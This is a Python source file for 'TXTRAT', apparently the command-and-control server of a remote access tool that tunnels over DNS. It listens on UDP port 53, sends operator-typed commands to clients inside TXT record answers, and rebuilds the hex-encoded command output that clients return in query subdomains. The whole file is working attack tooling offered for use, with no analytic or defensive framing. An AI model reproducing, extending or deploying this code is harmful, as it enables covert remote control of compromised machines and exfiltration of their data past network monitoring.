import socket, glob, json
from optparse import OptionParser

out = ''

def load_zones():

    jsonzone = {}
    zonefiles = glob.glob('zones/*.zone')

    for zone in zonefiles:
        with open(zone) as zonedata:
            data = json.load(zonedata)
            zonename = data["$origin"]
            jsonzone[zonename] = data
    return jsonzone

zonedata = load_zones()

def getflags(flags):

    byte1 = bytes(flags[:1])
    byte2 = bytes(flags[1:2])

    rflags = ''

    QR = '1'

    OPCODE = ''
    for bit in range(1,5):
        OPCODE += str(ord(byte1)&(1<<bit))

    AA = '1'

    TC = '0'

    RD = '0'

    # Byte 2

    RA = '0'

    Z = '000'

    RCODE = '0000'

    return int(QR+OPCODE+AA+TC+RD, 2).to_bytes(1, byteorder='big') + int(RA+Z+RCODE, 2).to_bytes(1, byteorder='big')

def getquestiondomain(data):

    state = 0
    expectedlength = 0
    domainstring = ''
    domainparts = []
    x = 0
    y = 0
    for byte in data:
        if state == 1:
            if byte != 0:
                domainstring += chr(byte)
            x += 1
            if x == expectedlength:
                domainparts.append(domainstring)
                domainstring = ''
                state = 0
                x = 0
            if byte == 0:
                domainparts.append(domainstring)
                break
        else:
            state = 1
            expectedlength = byte
        y += 1

    questiontype = data[y:y+2]

    return (domainparts, questiontype)

def printreturn():
    global out
    print(out.replace(";", "\n").rstrip(",;0"))
    out = ''

def formatout(domain):
    global out
    printreturn()

    dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': 'confirmed end'}]}

    return dictreturn

def pullchunksfirst(domain):
    global out

    c2id = '31337'							# set this later when working with multiple connections
    chunk = domain[0]
    out += bytes.fromhex(chunk).decode('utf-8')

    dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': c2id}]}

    return dictreturn

def pullchunks(domain):
    global out

    c2id = domain[0]
    chunk = domain[1]
    out += bytes.fromhex(chunk).decode('utf-8')

    dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': chunk}]}

    return dictreturn

def getzone(domain):
    global zonedata

    zone_name = '.'.join(domain)
    if zone_name in zonedata:
        return zonedata[zone_name]
    else:
        if len(domain) == 4:
            return formatout(domain)
        elif len(domain) == 5:
            return pullchunksfirst(domain)
        elif len(domain) == 6:
            return pullchunks(domain)

def getrecs(data):
    domain, questiontype = getquestiondomain(data)
    qt = ''
    if questiontype == b'\x00\x01':
        qt = 'a'

    if questiontype == b'\x00\x10':
        qt = 'txt'

    zone = getzone(domain)

    return (zone[qt], qt, domain)

def buildquestion(domainname, rectype):
    qbytes = b''

    for part in domainname:
        length = len(part)
        qbytes += bytes([length])

        for char in part:
            qbytes += ord(char).to_bytes(1, byteorder='big')

    if rectype == 'a':
        qbytes += (1).to_bytes(2, byteorder='big')

    if rectype == 'txt':
        qbytes += (16).to_bytes(2, byteorder='big')

    qbytes += (1).to_bytes(2, byteorder='big')

    return qbytes

def rectobytes(domainname, rectype, recttl, recval):

    rbytes = b'\xc0\x0c'

    if rectype == 'a':
        rbytes = rbytes + bytes([0]) + bytes([1])

    if rectype == 'txt':
        rbytes = rbytes + bytes([0]) + bytes([16])

    rbytes = rbytes + bytes([0]) + bytes([1])
    rbytes += int(recttl).to_bytes(4, byteorder='big')

    if rectype == 'a':
        rbytes = rbytes + bytes([0]) + bytes([4])

        for part in recval.split('.'):
            rbytes += bytes([int(part)])

    if rectype == 'txt':
        rbytes = rbytes + (len(recval)+1).to_bytes(2, byteorder='big')

        if len(recval) <= 256:
            rbytes += (len(recval)).to_bytes(1, byteorder='big')
        else:
            rbytes += (len(recval)).to_bytes(2, byteorder='big')


        rbytes += (recval).encode()


    return rbytes

def buildresponse(data, command):

    # Transaction ID
    TransactionID = data[:2]

    # Get the flags
    Flags = getflags(data[2:4])

    # Question Count
    QDCOUNT = b'\x00\x01'

    # Answer Count
    ANCOUNT = (1).to_bytes(2, byteorder='big')

    # Nameserver Count
    NSCOUNT = (0).to_bytes(2, byteorder='big')

    # Additonal Count
    ARCOUNT = (0).to_bytes(2, byteorder='big')

    dnsheader = TransactionID+Flags+QDCOUNT+ANCOUNT+NSCOUNT+ARCOUNT

    # Create DNS body
    dnsbody = b''

    # Get answer for query
    records, rectype, domainname = getrecs(data[12:])

    dnsquestion = buildquestion(domainname, rectype)

    for record in records:
        if rectype == 'a':
            dnsbody += rectobytes(domainname, rectype, record["ttl"], record["value"])
        if rectype == 'txt':
            if len(domainname) > 3:
                
                dnsbody += rectobytes(domainname, rectype, record["ttl"], record["value"])	# if I need a unique value for future commands, continue to brance, if not, combine with prior if (if rectype == 'a' && len(domainname) > 3:)
            else:
                dnsbody += rectobytes(domainname, rectype, record["ttl"], command)

    return dnsheader + dnsquestion + dnsbody


def main():
    global out

    usage = "TXTRAT"
    parser = OptionParser()

    # IP address
    parser.add_option(
        "-a",
        "--address",
        help = "IPv4 address to set as listener",
        action = "store",
        type = "string",
        dest = "address",
        default = '127.0.0.1'
    )

    (options, args) = parser.parse_args()

    ip = options.address
    port = 53

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((ip, port))

    while 1:
        command = input("input: ")
        out += command + "\n"
        while len(out) != 0:
            data, addr = sock.recvfrom(512)
            r = buildresponse(data, command)
            sock.sendto(r, addr)


    """command = input("input: ")
    while 1:
        data, addr = sock.recvfrom(512)
        r = buildresponse(data, command)
        sock.sendto(r, addr)
    """

main()
